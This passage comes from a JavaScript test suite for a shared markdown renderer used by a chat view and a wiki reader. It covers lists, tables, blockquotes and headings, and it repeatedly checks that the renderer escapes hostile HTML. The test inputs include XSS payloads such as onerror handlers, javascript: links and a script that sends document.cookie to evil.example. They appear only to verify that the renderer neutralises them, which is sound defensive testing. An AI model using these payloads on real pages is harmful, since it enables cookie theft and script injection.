    `a 315 KB page (the real corpus maximum) of pure unclosed wikilinks renders in ${tRealMax.toFixed(0)} ms`);

  // Benign content must not have paid for any of this.
  const tBenign = timeMs('word '.repeat(60000)); // 300 KB of ordinary prose
  ok(tBenign < 500, `300 KB of ordinary prose still renders in ${tBenign.toFixed(0)} ms (unchanged by the bound)`);
}

// ══ 5. Block formatting ══════════════════════════════════════════════════
section('5. Block formatting');
{
  const h = renderMarkdown('### A heading\n\nSome text.');
  ok(/<div class="chat-md-h chat-md-h3">A heading<\/div>/.test(h),
    'ATX heading → styled heading div (base class kept, level class from the fixed set — v3.72.0)');
  ok(/<p>Some text\.<\/p>/.test(h), 'paragraph wrapped in <p>');

  ok(/<ul><li>one<\/li><li>two<\/li><\/ul>/.test(renderMarkdown('- one\n- two')), 'dash bullets → <ul>');
  ok(/<ul><li>a<\/li><\/ul>/.test(renderMarkdown('* a')), 'star bullet → <ul>');
  ok(/<ul><li>a<\/li><\/ul>/.test(renderMarkdown('+ a')), 'plus bullet → <ul>');
  ok(/<ol><li>one<\/li><li>two<\/li><\/ol>/.test(renderMarkdown('1. one\n2. two')), 'numbered → <ol>');

  const mixed = renderMarkdown('- a\n1. b');
  ok(/<ul>.*<\/ul><ol>.*<\/ol>/.test(mixed), 'switching list type closes the previous list');

  const fence = renderMarkdown('before\n\n```js\nconst x = 1;\n```\n\nafter');
  ok(/<pre><code>const x = 1;<\/code><\/pre>/.test(fence), 'fenced block → <pre><code>');
  ok(fence.includes('<p>before</p>') && fence.includes('<p>after</p>'), 'text around a fence stays paragraphs');
  ok(!fence.includes('```'), 'the fence markers are consumed');

  const unclosed = renderMarkdown('```\nstill open');
  ok(/<pre><code>still open<\/code><\/pre>/.test(unclosed), 'an unterminated fence still flushes (no content lost)');

  const multiline = renderMarkdown('line one\nline two');
  ok(/<p>line one<br>line two<\/p>/.test(multiline), 'soft line break → <br> inside one paragraph');
}

// ══ 6. Inline formatting + wiki tokens ═══════════════════════════════════
section('6. Inline formatting, wikilinks, citations');
{
  ok(/<strong>b<\/strong>/.test(renderMarkdown('**b**')), '** → <strong>');
  ok(/<strong>b<\/strong>/.test(renderMarkdown('__b__')), '__ → <strong>');
  ok(/<em>i<\/em>/.test(renderMarkdown('an *i* word')), '* → <em>');
  ok(/<em>i<\/em>/.test(renderMarkdown('an _i_ word')), '_ → <em>');
  ok(!/<em>/.test(renderMarkdown('snake_case_name here')), 'snake_case is not italicised');
  ok(/<code>x<\/code>/.test(renderMarkdown('a `x` b')), 'backticks → <code>');

  const wl = renderMarkdown('The [[concepts/rag.md]] page and [[tali-rezun|Dr. Rezun]] both apply.');
  ok(/<span class="chat-wikilink">rag<\/span>/.test(wl), 'wikilink shows readable slug (folder + .md stripped)');
  ok(/<span class="chat-wikilink">Dr\. Rezun<\/span>/.test(wl), 'aliased wikilink shows the alias');

  const cite = renderMarkdown('See [source: concepts/rag.md] for details.');
  ok(/<span class="chat-citation-tag">/.test(cite), 'citation chip rendered');
  ok(/<span class="chat-cite-path">concepts\/rag\.md<\/span>/.test(cite), 'citation path in a text-content span');
  ok(/data-icon="dot"/.test(cite), 'citation chip carries the dot icon');
  ok(iconCalls.some(([n, s]) => n === 'dot' && s === 7), 'icon() called as icon("dot", 7)');
}

// ══ 7. Defensive inputs ══════════════════════════════════════════════════
section('7. Defensive inputs');
{
  ok(renderMarkdown('') === '', 'empty string → empty');
  ok(renderMarkdown(null) === '', 'null → empty string (no throw)');
  ok(renderMarkdown(undefined) === '', 'undefined → empty string (no throw)');
  ok(renderMarkdown('plain sentence.') === '<p>plain sentence.</p>', 'plain text → one paragraph');
  ok(typeof renderMarkdown(42) === 'string', 'a number does not throw');
  ok(typeof renderMarkdown({ a: 1 }) === 'string', 'an object does not throw');
  ok(typeof renderMarkdown(['x']) === 'string', 'an array does not throw');
  const big = renderMarkdown('word '.repeat(20000));
  ok(typeof big === 'string' && big.length > 0, '100 KB of text renders without throwing');
  ok(renderMarkdown('\n\n\n') === '', 'blank lines only → empty');
  ok(typeof renderMarkdown('[[' .repeat(500)) === 'string', 'unclosed wikilink storm does not throw');
  ok(typeof renderMarkdown('`'.repeat(500)) === 'string', 'backtick storm does not throw');
}

// ══ 8. THE WIDENING — wiki page bodies as hostile input ══════════════════
// After the lift this renderer also renders wiki page bodies. Those are
// LLM-authored, hand-editable, and delivered over Personal Sync and Shared
// Brain mirrors — i.e. content another person's machine wrote. A wiki page is
// exactly the kind of document that legitimately contains raw HTML, so the
// escape-first rule has to hold on realistic page shapes, not just on chat
// prose.
section('8. Widening — realistic wiki page bodies');
{
  const page = [
    '# Retrieval-Augmented Generation',
    '',
    '## Definition',
    '',
    'RAG combines **retrieval** with *generation*. See [[vector-database]] and',
    '[[concepts/embeddings.md|embeddings]].',
    '',
    '## Key Facts',
    '',
    '- Introduced by [[meta-ai]] in 2020',
    '- Uses a `retriever` + a `generator`',
    '',
    '## Related',
    '',
    '- [[summaries/the-rag-paper]]',
  ].join('\n');
  const h = renderMarkdown(page);
  ok(/<div class="chat-md-h chat-md-h1">Retrieval-Augmented Generation<\/div>/.test(h), 'page H1 renders as a heading');
  ok((h.match(/class="chat-md-h /g) || []).length === 4, 'all four headings render as headings');
  ok((h.match(/class="chat-md-h chat-md-h2"/g) || []).length === 3, 'and the three ## sections keep their level (v3.72.0)');
  ok(/<ul>/.test(h) && (h.match(/<li>/g) || []).length === 3, 'the bullet sections render as lists');
  ok(!/^##|\*\*retrieval\*\*/m.test(h), 'no raw ## or ** markers leak into the output');
  ok((h.match(/chat-wikilink/g) || []).length === 4, 'every [[wikilink]] renders as a styled span');
  ok(/<span class="chat-wikilink">embeddings<\/span>/.test(h), 'aliased wikilink in a page body uses the alias');
  ok(/<code>retriever<\/code>/.test(h), 'inline code in a page body renders');
  ok(!hasLiveHandlerOrUrlAttr(h) && foreignTags(h).length === 0, 'a realistic page emits no foreign markup');
}
{
  // A page that arrived over a mirror carrying an injection payload. Wiki
  // bodies are hand-editable, so this is a plausible artefact, not a stunt.
  const hostile = [
    '# Innocent Title',
    '',
    'Normal prose here.',
    '',
    '<script>fetch("https://evil.example/"+document.cookie)</script>',
    '',
    '<a href="javascript:alert(1)">click me</a>',
    '',
    '<img src=x onerror="alert(1)">',
    '',
    '<iframe src="https://evil.example"></iframe>',
    '',
    '<style>body{display:none}</style>',
    '',
    '- [[a" onmouseover="alert(1)]]',
  ].join('\n');
  const h = renderMarkdown(hostile);
  ok(!/<script|<iframe|<style|<a\s/i.test(h), 'script/iframe/style/anchor from a mirrored page are all inert');
  ok(!hasLiveHandlerOrUrlAttr(h), 'no live handler or URL attribute survives a hostile page body');
  ok(foreignTags(h).length === 0, `no foreign tag from a hostile page (saw: ${foreignTags(h).join(',') || 'none'})`);
  ok(h.includes('&lt;script&gt;') && h.includes('&lt;iframe'), 'the payloads are shown as escaped text, not dropped silently');
  ok(h.includes('Normal prose here.'), 'legitimate content around the payload still renders');
}

// ══ 9. Wiring — one renderer, both surfaces ══════════════════════════════
// Behaviour above proves the renderer is safe. This section proves the two
// surfaces actually USE it — and that the wiki reader stopped shipping
// escaped source. Source-level, so it must run on comment-stripped code.
section('9. Wiring — chat and the wiki reader share ONE renderer');
{
  const chatSrc = readFileSync(P_CHAT, 'utf8');
  const domSrc = readFileSync(P_DOMAINS, 'utf8');
  const chatCode = assertStrippedSane(stripComments(chatSrc), 'chat.js',
    ['function renderThread', 'renderMarkdown(']);
  const domCode = assertStrippedSane(stripComments(domSrc), 'domains.js',
    ['async function openWikiPageFromBrowse', 'bodyHtml:']);

  ok(existsSync(P_SHARED), 'src/public/next/shared/markdown.js exists');
  if (existsSync(P_SHARED)) {
    const sharedCode = assertStrippedSane(stripComments(readFileSync(P_SHARED, 'utf8')), 'shared/markdown.js',
      ['export function renderMarkdown', 'function escHtml']);
    ok(/export function renderMarkdown/.test(sharedCode), 'the shared module EXPORTS renderMarkdown');
    ok(/import \{[^}]*\bicon\b[^}]*\} from '\.\.\/app\.js'/.test(sharedCode),
      'the shared module imports icon from the shell (no second icon table)');
  }

  ok(/import \{[^}]*renderMarkdown[^}]*\} from '\.\.\/shared\/markdown\.js'/.test(chatCode),
    'chat.js imports renderMarkdown from the shared module');
  ok(!/(?:^|\n)function renderMarkdown\s*\(/.test(chatCode),
    'chat.js no longer declares its own renderMarkdown');
  ok(!/(?:^|\n)function (?:escHtml|formatSegment|renderInline)\s*\(/.test(chatCode),
    'chat.js no longer carries the renderer\'s private helpers');
  ok(/renderMarkdown\(/.test(chatCode), 'chat.js still calls renderMarkdown (the thread + its reader)');

  ok(/import \{[^}]*renderMarkdown[^}]*\} from '\.\.\/shared\/markdown\.js'/.test(domCode),
    'domains.js imports renderMarkdown from the shared module');
  ok(!/dm-page-source/.test(domCode),
    'domains.js no longer renders the wiki body as escaped <pre> source');
  ok(/bodyHtml:\s*renderMarkdown\(/.test(domCode),
    'domains.js hands openReader() rendered markdown for the page body');
  ok(!/(?:^|\n)function renderMarkdown\s*\(/.test(domCode),
    'domains.js did not grow its own copy of the renderer');

  // Comment-stripped, and that is load-bearing: domains.css now carries a
  // note EXPLAINING that `.dm-page-source` was removed, and that note names
  // the class. A raw-text check would read the explanation and report the
  // rule as still present — the "the check stopped reaching what it
  // protects" failure, inverted.
  const domCss = assertStrippedSane(stripComments(readFileSync(P_DOMAINS_CSS, 'utf8')), 'domains.css',
    ['.dm-browse-card {', '.dm-browse-note {']);
  ok(!/\.dm-page-source/.test(domCss), 'the dead .dm-page-source RULE is gone from domains.css');

  // The classes the SHARED renderer emits must be styled for BOTH surfaces.
  // .reader-body-text is the shell's wrapper for openReader()'s bodyHtml, so
  // a rule that only reaches .chat-answer leaves the wiki reader unstyled.
  const chatCss = assertStrippedSane(stripComments(readFileSync(P_CHAT_CSS, 'utf8')), 'chat.css',
    ['.chat-md-h {', '.reader-body-text .chat-md-h']);
  for (const cls of ['chat-md-h', 'chat-wikilink', 'chat-citation-tag']) {
    ok(new RegExp('^\\.' + cls + '\\b', 'm').test(chatCss),
      `.${cls} is styled unscoped (reaches the reader as well as the bubble)`);
  }
  // The renderer emits a FOURTH class, `chat-cite-path`, and this loop
  // deliberately excludes it: it carries no styling anywhere in /next and is
  // not supposed to. It is a SELECTOR HOOK — chat.js reads the citation path
  // out of its textContent (the M3 fix) — and it inherits its appearance from
  // the `.chat-citation-tag` parent. Both chat.css's section note and
  // shared/markdown.js's header used to claim all FOUR were styled unscoped,
  // which was false; corrected, and pinned here so the claim and the
  // stylesheet cannot drift apart again in either direction.
  {
    const citePathRules = (chatCss.match(/^[^\n{]*\.chat-cite-path\b[^\n{]*\{/gm) || []);
    ok(citePathRules.length === 0 || citePathRules.every((r) => /^\s*\.chat-cite-path\b/.test(r)),
      citePathRules.length === 0
        ? '.chat-cite-path has NO rule — it is a selector hook, and both source comments now say so'
        : `.chat-cite-path gained a rule and it is scoped correctly (unscoped, so it reaches the reader): ${JSON.stringify(citePathRules)}`);
    ok(/chat-cite-path/.test(readFileSync(P_SHARED, 'utf8')) && /chat-cite-path/.test(chatSrc),
      'the class IS emitted by the renderer and IS read back by chat.js (it is live, just unstyled)');
  }
  // Anchored on the opening brace, NOT on a word boundary. Caught by mutation:
  // `/\.reader-body-text pre\b/` still matched after the `pre` rule was
  // deleted, because the neighbouring `.reader-body-text pre code { … }` rule
  // contains the same prefix — the guard stayed green over the exact deletion
  // it exists to catch. A decorative guard inside the change that adds it.
  ok(/\.reader-body-text pre \{/.test(chatCss), 'the reader body styles <pre> (a wiki page may contain a fenced block)');
  ok(/\.reader-body-text code \{/.test(chatCss), 'the reader body styles inline <code>');
  ok(/\.reader-body-text pre code \{/.test(chatCss), 'code inside a fenced block is not double-backgrounded');
}

// ── 10. GFM TABLES ────────────────────────────────────────────────────────
// Added with table support. The reported defect was that a table an LLM
// wrote CORRECTLY came out as one paragraph of pipes and dashes joined by
// <br> — so the first assertion here is the regression itself, and the rest
// guard the two things a table pass can plausibly get wrong: swallowing
// something that is NOT a table, and opening a hole in the cardinal rule by
// emitting an attribute.
section('10. GFM tables');
{
  const REPORTED = [
    '| Layer | Purpose | From Your Earlier Work |',
    '|-------|---------|--------------------|',
    '| **Foundational documentation** | Stable project knowledge | "Three-Phase Process" |',
    '| **Working state** (agent memory) | Current session context | *This article*—now automated |',
  ].join('\n');
  const h = renderMarkdown(REPORTED);
  ok(h.includes('<table class="chat-md-table">'), 'the reported table renders as a real <table>');
  ok(/<thead><tr><th>Layer<\/th><th>Purpose<\/th>/.test(h), 'the header row becomes <th> cells');
  ok((h.match(/<tr>/g) || []).length === 3, 'one header row + two body rows');
  ok((h.match(/<td>/g) || []).length === 6, 'six body cells across two rows');
  // THE REGRESSION, stated as itself: before this pass existed, every one of
  // those lines landed in a single <p> joined by <br>, pipes and all.
  ok(!/<p>\|/.test(h) && !h.includes('|-------|'),
    'REGRESSION: no raw pipe/dash row survives into a paragraph');
  ok(h.includes('<strong>Foundational documentation</strong>'), 'cell content is still inline-formatted');
  ok(h.includes('<div class="chat-md-table-wrap">'),
    'the table is wrapped for horizontal containment — #main is the scroller, so an unwrapped wide table moves the whole page');

  // Alignment comes from a FIXED enum, never from parsed text.
  const al = renderMarkdown('| L | C | R |\n| :-- | :-: | --: |\n| a | b | c |');
  ok(al.includes('<th class="chat-md-al-left">L</th>'), 'left alignment class');
  ok(al.includes('<th class="chat-md-al-center">C</th>'), 'center alignment class');
  ok(al.includes('<th class="chat-md-al-right">R</th>'), 'right alignment class');
  ok(al.includes('<td class="chat-md-al-center">b</td>'), 'body cells inherit the column alignment');
  ok(sandbox.tableAlignClass('---') === '', 'no alignment marker emits no attribute at all');

  // GFM's optional edge pipes.
  const bare = renderMarkdown('a | b\n--- | ---\n1 | 2');
  ok(bare.includes('<th>a</th><th>b</th>'), 'leading/trailing pipes are optional (GFM)');

  // An empty FIRST column is a real column. Dropping empty edge cells instead
  // of stripping ONE delimiter pipe shifts every cell left and silently
  // misaligns the row against its header — the reason splitTableRow strips
  // delimiters rather than filtering.
  const empt = renderMarkdown('| | b |\n|---|---|\n| | y |');
  ok(empt.includes('<th></th><th>b</th>'), 'an empty leading column is preserved, not shifted away');
  ok(empt.includes('<td></td><td>y</td>'), 'the body row stays aligned under it');

  // Escaped pipes belong to the cell.
  const esc = renderMarkdown('| cmd | note |\n|---|---|\n| `a \\| b` | pipes |');
  ok(esc.includes('<code>a | b</code>'), 'an escaped \\| is a literal pipe inside the cell, not a column break');
  ok((esc.match(/<td/g) || []).length === 2, 'and it does not create a third column');

  // Ragged rows: GFM pads short and truncates long, both to the header count.
  const rag = renderMarkdown('| a | b | c |\n|---|---|---|\n| 1 |\n| 1 | 2 | 3 | 4 |');
  const rows = rag.split('<tr>').slice(2); // drop pre-table and the header row
  ok(rows.every((r) => (r.match(/<td/g) || []).length === 3),
    'every body row carries exactly the header column count (short padded, long truncated)');

  // ── What must NOT become a table ─────────────────────────────────────
  ok(renderMarkdown('Some text\n-------').includes('<p>'),
    'a setext-style "text over dashes" is NOT swallowed as a one-column table');
  ok(!renderMarkdown('Use the | character\n--------').includes('<table'),
    'prose that merely mentions a pipe above a rule is not a table (cell counts differ)');
  ok(!renderMarkdown('| a | b |\n|---|').includes('<table'),
    'a delimiter row whose cell count differs from the header is rejected (GFM)');
  ok(!renderMarkdown('| a | b |\n| c | d |').includes('<table'),
    'two pipe rows with no delimiter row between them are not a table');

  // A fence is handled one branch UP; eating it here would swallow a whole
  // code block into a cell.
  const fen = renderMarkdown('| a |\n|---|\n| 1 |\n```\n| not | a | row |\n```');
  ok(fen.includes('<pre><code>| not | a | row |</code></pre>'),
    'a fence terminates the table and its contents stay a code block');
  ok((fen.match(/<table/g) || []).length === 1, 'and only one table was produced');

  // Prose resumes after the table.
  ok(renderMarkdown('| a |\n|---|\n| 1 |\nplain prose, no pipe').includes('<p>plain prose, no pipe</p>'),
    'a pipe-less line ends the table and resumes as a paragraph');

  // ── THE CARDINAL RULE, inside cells ──────────────────────────────────
  const hostile = '| <script>alert(1)</script> | " onerror="alert(2) |\n|---|---|\n' +
                  '| <img src=x onerror=alert(3)> | [[a]] |';
  const hh = renderMarkdown(hostile);
  ok(foreignTags(hh).length === 0, 'no foreign tag escapes from a table cell (' + foreignTags(hh).join(',') + ')');
  // Scanned over REAL TAGS ONLY, deliberately. The hostile input above carries
  // the literal characters ` onerror="` as CELL TEXT; escHtml turned its quotes
  // into &quot; and it stays inert text forever. A whole-string regex here
  // reports that as an attribute and fails green-for-the-wrong-reason — the
  // same distinction the foreignTags() note above already draws.
  const tagStrings = (hh.match(/<[a-zA-Z][^>]*>/g) || []).join(' ');
  ok(!/\son\w+\s*=/.test(tagStrings), 'no event-handler attribute is ever emitted from a table cell');
  ok(hh.includes('&quot; onerror=&quot;alert(2)'),
    'and the attribute-shaped text is still present as inert, escaped TEXT (so the assertion above is not vacuous)');
  ok(hh.includes('&lt;script&gt;'), 'raw HTML in a cell stays escaped text');
  // The ONLY attribute a table emits is class, and only from the fixed enum.
  const attrs = (hh.match(/<(?:table|thead|tbody|tr|th|td)[^>]*>/g) || []).join(' ');
  ok(!/\s(?!class=")\w[\w-]*=/.test(attrs.replace(/class="chat-md-(?:table|al-left|al-center|al-right)"/g, '')),
    'table markup carries no attribute other than the renderer\'s own fixed class names');

  // A table row is not a bullet list, and vice versa.
  ok(!renderMarkdown('| - | x |\n|---|---|\n| a | b |').includes('<ul>'),
    'a cell whose text is "-" does not start a bullet list');
}

// ═══════════════════════════════════════════════════════════════════════════
section('11. Ordered lists keep the number they were written with');
// ═══════════════════════════════════════════════════════════════════════════
/**
 * THE REPORT, AND WHICH CASE IT ACTUALLY WAS.
 *
 * A user (Robin Good, with screenshots) asked one question of two models. The
 * Flash Lite 2.5 answer rendered "1." four times; the Sonnet 5 answer rendered
 * 1, 2, 3. In the Flash Lite screenshot each numbered item was followed by a
 * citation chip line of its own and then a blank line.
 *
 * Two hypotheses were possible and they are NOT the same defect:
 *   (a) the model wrote "1." for every item;
 *   (b) something between the items ended the list, and each following item
 *       opened a fresh <ol> that the browser restarted at 1.
 *
 * §11a settles it by EXECUTING the renderer on both shapes. (a) has never been
 * the bug — a contiguous "1. 1. 1." already renders 1, 2, 3, because a browser
 * numbers <li> elements by position. (b) is the bug, and the citation line is
 * one instance of it: this renderer treats ANY non-list line as the end of the
 * list, and the model's own `[source: …]` line is a non-list line.
 */
{
  const CITE = '[source: summaries/89-what-wins-attention-in-the-age-of-ai.md]';

  // ── §11a — WHICH CASE IT WAS ────────────────────────────────────────────
  const contiguousRepeat = renderMarkdown('1. one\n1. two\n1. three');
  ok((contiguousRepeat.match(/<ol/g) || []).length === 1 &&
     (contiguousRepeat.match(/<li>/g) || []).length === 3 &&
     !/start=/.test(contiguousRepeat),
    '§11a hypothesis (a) REFUTED: a contiguous "1. 1. 1." was always ONE <ol> of three items, i.e. 1, 2, 3');

  const screenshot = renderMarkdown(
    '1. **Attention is scarce** — the first claim.\n' + CITE + '\n\n' +
    '2. **Trust compounds** — the second claim.\n' + CITE + '\n\n' +
    '3. **Distribution is the moat** — the third claim.\n' + CITE);
  const opens = screenshot.match(/<ol[^>]*>/g) || [];
  ok(opens.length === 3,
    `§11a hypothesis (b) CONFIRMED: the screenshot's shape still produces THREE separate lists (${opens.length})`);
  ok(JSON.stringify(opens) === JSON.stringify(['<ol>', '<ol start="2">', '<ol start="3">']),
    `§11a …and the second and third now carry their own start, so the reader sees 1, 2, 3 (${opens.join(' ')})`);
  ok((screenshot.match(/chat-citation-tag/g) || []).length === 3,
    '§11a CONTROL: all three citation chips are still rendered — nothing was swallowed to achieve this');

  // ── §11b — start IS NOT EMITTED WHEN THE LIST OPENS AT 1 ────────────────
  // The overwhelming majority of lists must render byte-identically to before
  // this change; measured on the maintainer's corpus, 21 of 5,575 documents
  // moved and every one was a genuinely mis-numbered list.
  ok(!/start=/.test(renderMarkdown('1. a\n2. b\n3. c')),
    '§11b an ordinary 1/2/3 list carries no start attribute at all');
  ok(!/start=/.test(renderMarkdown('- a\n- b')),
    '§11b …nor does a bullet list, which has no number to carry');
  ok(renderMarkdown('- a\n- b') === '<ul><li>a</li><li>b</li></ul>',
    '§11b CONTROL: the <ul> path is byte-unchanged');
  ok(renderMarkdown('1. a\n2. b') === '<ol><li>a</li><li>b</li></ol>',
    '§11b CONTROL: the ordinary <ol> path is byte-unchanged');

  // ── §11c — ONLY THE OPENING ITEM SETS IT ────────────────────────────────
  ok(/^<ol start="7">/.test(renderMarkdown('7. seven\n8. eight\n9. nine')),
    '§11c a list that opens at 7 starts at 7');
  ok((renderMarkdown('7. seven\n8. eight').match(/start=/g) || []).length === 1,
    '§11c …and the later numbers are ignored, as CommonMark requires');
  ok(/^<ol start="7">/.test(renderMarkdown('7. seven\n2. two\n99. ninetynine')),
    '§11c …even when the later numbers are nonsense');

  // A new list after a paragraph re-reads the opening number; it never
  // inherits the previous list's.
  const twoLists = renderMarkdown('5. five\n\ntext between\n\n1. one');
  ok(twoLists.includes('<ol start="5">') && twoLists.includes('</ol><p>text between</p><ol><li>one'),
    '§11c a later list that opens at 1 gets NO start');
  /* NOT ENFORCED, and said rather than implied: flushList's `listStart = 1`
     reset is DEFENCE IN DEPTH, not load-bearing. Deleting it leaves this whole
     section green — `listType` only becomes 'ol' inside the `num` branch, and
     that branch assigns `listStart` whenever no list is open, so the stale
     value is unreachable today. The mutation that proved this is recorded
     beside the declaration in shared/markdown.js. */

  // ── §11d — THE ATTRIBUTE IS OURS, NOT THE INPUT'S ───────────────────────
  // The cardinal rule is that no INPUT TEXT reaches an attribute. The value
  // here is a Number this module produced from a digits-only capture and
  // re-stringified, exactly like tableAlignClass's fixed class names.
  for (const hostile of [
    '2" onmouseover="alert(1)". item',
    '2' + String.fromCharCode(0) + '. item',
    '00000000000000000000002. item',   // 21 digits — over the \d{1,9} bound
  ]) {
    const h = renderMarkdown(hostile);
    ok(!/\son\w+\s*=/.test((h.match(/<[a-zA-Z][^>]*>/g) || []).join(' ')),
      `§11d no event-handler attribute escapes from ${JSON.stringify(hostile.slice(0, 24))}`);
    ok(!/<ol start="[^"]*[^0-9"][^"]*"/.test(h),
      '§11d …and any start attribute emitted contains digits only');
  }
  ok(!/<ol/.test(renderMarkdown('0000000000. over the bound')),
    '§11d a run of digits past the \\d{1,9} bound is not a list at all — it degrades to text, never a half-list');
  ok(/^<ol start="999999999">/.test(renderMarkdown('999999999. at the bound')),
    '§11d CONTROL: exactly nine digits is still a list, so the bound is a bound and not a ban');

  // ── §11e — THE LIMIT, STATED ────────────────────────────────────────────
  // Named so nobody reads §11a as "the numbering is fixed in every case".
  const allOnes = renderMarkdown('1. one\n' + CITE + '\n\n1. two\n' + CITE);
  ok((allOnes.match(/<ol[^>]*>/g) || []).length === 2 && !/start=/.test(allOnes),
    '§11e KNOWN AND UNFIXED: a model that writes "1." for EVERY item AND breaks between them still renders 1, 1 — that is the number it wrote');
}

// ═══════════════════════════════════════════════════════════════════════════
section('12. v3.72.0 — quote, rule, heading levels, nesting, split citations');
// ═══════════════════════════════════════════════════════════════════════════
/**
 * DESIGN.md §5 (package P2). Every new pass runs on ALREADY-ESCAPED text and
 * gets its own XSS case here, next to its behaviour — the cardinal rule is
 * re-proven per pass, not assumed to carry over.
 */
const HOOK_ATTRS = ['class', 'data-icon', 'width', 'type', 'data-cite-n', 'aria-hidden', 'start'];
function attrNames(html) {
  return realTags(html).flatMap((t) => [...t.matchAll(/\s([a-zA-Z:-]+)=/g)].map((m) => m[1]));
}
function mkHook() {
  const order = [];
  const calls = [];
  const cite = (p) => { calls.push(p); if (!order.includes(p)) order.push(p); return order.indexOf(p) + 1; };
  return { cite, order, calls };
}
const ALLOWED_V372 = new Set([...ALLOWED_TAGS, 'blockquote', 'hr', 'button']);
function foreignTags372(html) {
  const out = [];
  const re = /<\/?([a-zA-Z][a-zA-Z0-9-]*)\b/g;
  let m;
  while ((m = re.exec(html))) if (!ALLOWED_V372.has(m[1].toLowerCase())) out.push(m[1]);
  return out;
}
const balanced = (h, tag) => (h.match(new RegExp('<' + tag + '\\b', 'g')) || []).length ===
  (h.match(new RegExp('</' + tag + '>', 'g')) || []).length;

// ── §12a BLOCKQUOTE ────────────────────────────────────────────────────────
{
  ok(renderMarkdown('> A quote.') === '<blockquote class="chat-md-quote"><p>A quote.</p></blockquote>',
    '§12a `> quote` → a blockquote (was a literal "&gt; …" paragraph — C3)');
  ok(!/&gt;/.test(renderMarkdown('> A quote.')), '§12a …and the marker is consumed, not shown');
  const two = renderMarkdown('> line one\n> line two');
  ok(two === '<blockquote class="chat-md-quote"><p>line one<br>line two</p></blockquote>',
    '§12a consecutive quote lines are ONE quote, soft-broken');
  ok(renderMarkdown('> para one\n>\n> para two') ===
    '<blockquote class="chat-md-quote"><p>para one</p><p>para two</p></blockquote>',
    '§12a a bare `>` line separates paragraphs inside the quote');
  const inAttr = renderMarkdown('> "Leadership is doing the right things."\n> — Peter Drucker');
  ok(inAttr.endsWith('<p class="chat-md-attrib">— Peter Drucker</p></blockquote>'),
    '§12a a trailing "— Name" inside the quote is its attribution');
  const outAttr = renderMarkdown('> "Quote."\n— Warren Bennis, *On Becoming a Leader*');
  ok(/<p class="chat-md-attrib">— Warren Bennis, <em>On Becoming a Leader<\/em><\/p><\/blockquote>$/.test(outAttr),
    '§12a a "— Name" line DIRECTLY under the quote joins it as attribution (inline formatting kept)');
  ok(/<\/blockquote><p>— later<\/p>/.test(renderMarkdown('> q\n\n— later')),
    '§12a …but not across a blank line');
  ok(/<p class="chat-md-attrib">-- Ann<\/p>/.test(renderMarkdown('> q\n> -- Ann')) &&
     /<p class="chat-md-attrib">– Ann<\/p>/.test(renderMarkdown('> q\n> – Ann')),
    '§12a `--` and an en dash also mark attribution');
  ok(!/chat-md-attrib/.test(renderMarkdown('> — only a dash line')),
    '§12a a quote that is ONLY a dash line is quoted text, not a credit for nothing');
  ok(/<p>&gt; nested<\/p>/.test(renderMarkdown('> > nested')), '§12a a second `>` stays literal (one level)');
  ok(!/blockquote/.test(renderMarkdown('&gt; typed as an entity')),
    '§12a the ENTITY typed in the input is escaped to &amp;gt; and never starts a quote');
  ok(/<p>before<\/p><blockquote/.test(renderMarkdown('before\n> q')), '§12a a quote line closes the paragraph above it');
  ok(/<\/ul><blockquote/.test(renderMarkdown('- item\n> q')), '§12a an unindented quote line closes an open list');
  ok(/blockquote/.test(renderMarkdown('   > indented quote')), '§12a an indented quote with no open list is still a quote');

  // XSS — the brief's own vector, and the attribution arm.
  for (const v of ['> <img src=x onerror=alert(1)>', '> ok\n> — <script>alert(1)</script>',
                   '> " onmouseover="alert(1)', '> [[a" onclick="x]]\n— <svg/onload=alert(1)>']) {
    const h = renderMarkdown(v);
    ok(foreignTags372(h).length === 0 && !hasLiveHandlerOrUrlAttr(h),
      `§12a XSS ${JSON.stringify(v.slice(0, 32))}: no foreign tag, no live attribute`);
    ok(balanced(h, 'blockquote') && balanced(h, 'p'), '§12a …and the quote markup is balanced');
  }
  ok(renderMarkdown('> <img src=x onerror=alert(1)>').includes('&lt;img src=x onerror=alert(1)&gt;'),
    '§12a the payload is shown as escaped text, not dropped');
}

// ── §12b THEMATIC BREAK ────────────────────────────────────────────────────
{
  for (const r of ['---', '***', '___', '- - -', '* * *', '_ _ _', '----------', '  ---  ']) {
    ok(renderMarkdown(r) === '<hr class="chat-md-hr">', `§12b ${JSON.stringify(r)} → <hr> (was a literal paragraph — C4)`);
  }
  ok(!/<ul>/.test(renderMarkdown('* * *')), '§12b `* * *` is a rule, NOT a bullet (the rule test runs first)');
  for (const notRule of ['--', '-*-', '--- x', '**bold**', '-- -x']) {
    ok(!/<hr/.test(renderMarkdown(notRule)), `§12b ${JSON.stringify(notRule)} is not a rule`);
  }
  ok(renderMarkdown('above\n---\nbelow') === '<p>above</p><hr class="chat-md-hr"><p>below</p>',
    '§12b a rule between two paragraphs closes the first and opens the second');
  ok(/<\/ol><hr class="chat-md-hr">/.test(renderMarkdown('1. a\n---')), '§12b a rule closes an open list');
  const x = renderMarkdown('--- <img src=x onerror=alert(1)>');
  ok(!/<hr/.test(x) && foreignTags372(x).length === 0 && !hasLiveHandlerOrUrlAttr(x),
    '§12b XSS: a rule-shaped line carrying a payload is not a rule and the payload is inert');
  const t = (s) => { const t0 = process.hrtime.bigint(); renderMarkdown(s); return Number(process.hrtime.bigint() - t0) / 1e6; };
  ok(t('- '.repeat(100000) + 'x') < 1500 && t('-'.repeat(200000) + 'x') < 1500,
    '§12b a 200 KB near-rule line renders in well under 1.5 s (the test is linear, no backtracking)');
}

// ── §12c HEADING LEVELS ────────────────────────────────────────────────────
{
  const lv = (n) => renderMarkdown('#'.repeat(n) + ' T');
  ok(lv(1) === '<div class="chat-md-h chat-md-h1">T</div>', '§12c # → level 1');
  ok(lv(2) === '<div class="chat-md-h chat-md-h2">T</div>', '§12c ## → level 2');
  ok(lv(3) === '<div class="chat-md-h chat-md-h3">T</div>', '§12c ### → level 3');
  ok([4, 5, 6].every((n) => lv(n) === '<div class="chat-md-h chat-md-h4">T</div>'), '§12c ####–###### → level 4 (the eyebrow face)');
  ok(!/<div/.test(renderMarkdown('####### seven')), '§12c seven #s is not a heading (unchanged)');
  for (const v of ['# <img src=x onerror=alert(1)>', '### h" onclick="alert(1)', '#### <script>x</script> **b**']) {
    const h = renderMarkdown(v);
    ok(foreignTags372(h).length === 0 && !hasLiveHandlerOrUrlAttr(h), `§12c XSS ${JSON.stringify(v)}: inert`);
    ok(/^<div class="chat-md-h chat-md-h[1-4]">/.test(h), '§12c …and the level class is one of the fixed four');
  }
}

// ── §12d ONE LEVEL OF LIST NESTING, AND INDENTED CONTINUATION ─────────────
{
